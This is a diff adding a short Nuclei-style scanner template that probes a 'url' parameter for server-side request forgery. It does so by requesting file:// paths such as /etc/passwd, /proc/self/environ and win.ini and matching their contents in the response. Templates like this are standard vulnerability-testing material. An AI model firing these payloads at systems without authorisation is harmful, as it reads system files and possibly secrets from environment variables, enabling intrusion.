@@ -1,0 +1,26 @@
+id: ssrf-read-files
+
+info:
+  name: Read Files via SSRF
+  author: Jake Lo.ai
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=file://{{files}}"
+
+    payloads:
+      files:
+        - "/etc/passwd"
+        - "/etc/hosts"
+        - "/proc/self/environ"
+        - "C:/Windows/win.ini"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[extensions\\]"
